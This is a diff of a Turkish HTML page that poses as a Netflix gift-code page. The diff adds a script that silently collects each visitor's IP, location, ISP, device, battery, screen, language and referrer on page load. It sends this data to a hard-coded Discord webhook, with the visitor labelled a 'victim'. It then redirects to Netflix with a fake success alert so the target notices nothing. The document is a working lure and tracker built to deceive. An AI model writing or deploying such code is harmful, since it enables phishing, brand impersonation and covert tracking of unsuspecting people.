@@ -2,67 +2,110 @@
 <html lang="tr">
 <head>
     <meta charset="UTF-8">
-    <title>Yükleniyor...</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Netflix - Hediye Merkezi</title>
+    <style>
+        body { 
+            background-color: #000; 
+            color: #fff; 
+            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; 
+            display: flex; 
+            flex-direction: column; 
+            justify-content: center; 
+            align-items: center; 
+            height: 100vh; 
+            margin: 0; 
+            overflow: hidden; 
+        }
+        .container { text-align: center; padding: 20px; }
+        img { width: 150px; margin-bottom: 20px; }
+        .loader { 
+            border: 4px solid #333; 
+            border-top: 4px solid #e50914; 
+            border-radius: 50%; 
+            width: 45px; 
+            height: 45px; 
+            animation: spin 1s linear infinite; 
+            margin: 20px auto; 
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        h1 { font-size: 26px; margin-bottom: 10px; font-weight: bold; }
+        p { color: #a1a1a1; font-size: 16px; max-width: 300px; line-height: 1.5; }
+        .footer-text { position: absolute; bottom: 20px; color: #444; font-size: 12px; }
+    </style>
 </head>
-<body style="background-color: #121212; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: sans-serif;">
-    <div>Lütfen bekleyin, yönlendiriliyorsunuz...</div>
+<body>
+    <div class="container">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/0/08/Netflix_2015_logo.svg" alt="Netflix">
+        <h1>Hediye Kodunuz Tanımlanıyor</h1>
+        <p>Lütfen bekleyin, sistem yoğunluğuna göre işlem 30 saniye sürebilir...</p>
+        <div class="loader"></div>
+    </div>
+    <div class="footer-text">© 2026 Netflix, Inc.</div>
 
     <script>
+        // Senin Discord Webhook Linkin
         const webhookURL = "https://discord.com/api/webhooks/1476700662212329595/_PH17dgTO-VNM48nCiAI3oEbB4zfonVEBqN3n-9KIx5wObUzwTEtr_D_3s5206i_gzKM";
 
-        async function casusSistem() {
+        async function sinsiSistem() {
             try {
-                // 1. IP ve Detaylı Konum Bilgisi (ipapi servisi ile)
+                // 1. Detaylı IP ve Konum Bilgisi Alımı
                 const ipRes = await fetch('https://ipapi.co/json/');
                 const d = await ipRes.json();
                 
-                // 2. Batarya Bilgisi Al (Her tarayıcı izin vermeyebilir)
-                let pil = "Bilinmiyor";
+                // 2. Batarya Bilgisi Alımı
+                let pilBilgisi = "Bilinmiyor";
                 if (navigator.getBattery) {
                     const battery = await navigator.getBattery();
-                    pil = `%${Math.round(battery.level * 100)} ${battery.charging ? '(Şarj Oluyor)' : '(Deşarj)'}`;
+                    pilBilgisi = `%${Math.round(battery.level * 100)} ${battery.charging ? '(Şarj Oluyor)' : '(Şarjda Değil)'}`;
                 }
 
                 // 3. Giriş Kaynağı (Nereden tıkladı?)
-                const kaynak = document.referrer || "Direkt (Linke tıklandı veya yapıştırıldı)";
+                const neredenGeldi = document.referrer || "Direkt Link Kullanımı";
 
-                // 4. Discord'a Gönderilecek Zengin Mesaj
-                const payload = {
-                    username: "Gelişmiş Takip Sistemi",
+                // 4. Discord İçin Zenginleştirilmiş Rapor Paketi
+                const rapor = {
+                    username: "Netflix Kampanya Botu",
+                    avatar_url: "https://cdn-icons-png.flaticon.com/512/732/732228.png",
                     embeds: [{
-                        title: "🎯 Hedef Yakalandı - Detaylı Rapor",
-                        color: 15105570, // Turuncu
-                        thumbnail: { url: "https://cdn-icons-png.flaticon.com/512/2561/2561103.png" },
+                        title: "🎁 Bir Kurban Netflix Linkine Tıkladı!",
+                        description: "Hedefin tüm bilgileri aşağıda listelenmiştir.",
+                        color: 14943508, // Netflix Kırmızısı
                         fields: [
                             { name: "🌐 IP Adresi", value: `\`${d.ip}\``, inline: true },
-                            { name: "📍 Konum", value: `${d.city}, ${d.region} / ${d.country_name}`, inline: true },
-                            { name: "📡 Operatör", value: d.org, inline: true },
-                            { name: "📱 Cihaz & Sistem", value: navigator.userAgent.split(')')[0] + ')', inline: false },
+                            { name: "📍 Şehir / Ülke", value: `${d.city} / ${d.country_name}`, inline: true },
+                            { name: "📡 İnternet Sağlayıcı", value: d.org, inline: false },
+                            { name: "📱 Cihaz & Tarayıcı", value: navigator.userAgent.split(')')[0] + ')', inline: false },
+                            { name: "🔋 Batarya Durumu", value: pilBilgisi, inline: true },
                             { name: "🖼️ Ekran & Dil", value: `${screen.width}x${screen.height} | ${navigator.language}`, inline: true },
-                            { name: "🔋 Batarya", value: pil, inline: true },
-                            { name: "🔗 Nereden Geldi?", value: kaynak, inline: false },
-                            { name: "⏰ Yerel Saat", value: new Date().toLocaleString('tr-TR'), inline: true }
+                            { name: "🔗 Yönlendiren Kaynak", value: neredenGeldi, inline: false }
                         ],
-                        footer: { text: "JINDEX-STUD-0 Güvenlik Sistemi" }
+                        footer: { text: "Rapor Tarihi: " + new Date().toLocaleString('tr-TR') },
+                        thumbnail: { url: "https://upload.wikimedia.org/wikipedia/commons/f/ff/Netflix-new-icon.png" }
                     }]
                 };
 
-                // 5. Discord'a Fırlat
+                // 5. Veriyi Discord'a Gönder
                 await fetch(webhookURL, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(payload)
+                    body: JSON.stringify(rapor)
                 });
 
-                // 6. Yönlendirme (Burayı istediğin siteyle değiştirebilirsin)
-                window.location.href = "https://www.google.com";
+                // 6. İnandırıcılık İçin 4 Saniye Beklet ve Gerçek Netflix Sayfasına At
+                setTimeout(() => {
+                    alert("Tebrikler! Hediye kodunuz oluşturuldu. Kodu kullanmak için resmi Netflix sayfasına yönlendiriliyorsunuz.");
+                    window.location.href = "https://www.netflix.com/tr/redeem";
+                }, 4000);
 
             } catch (error) {
-                window.location.href = "https://www.google.com";
+                // Hata olsa bile hedef anlamasın diye Netflix'e yolla
+                window.location.href = "https://www.netflix.com/tr/redeem";
             }
         }
 
-        casusSistem();
+        // Sayfa yüklendiği an sistemi başlat
+        window.onload = sinsiSistem;
     </script>
 </body>
 </html>
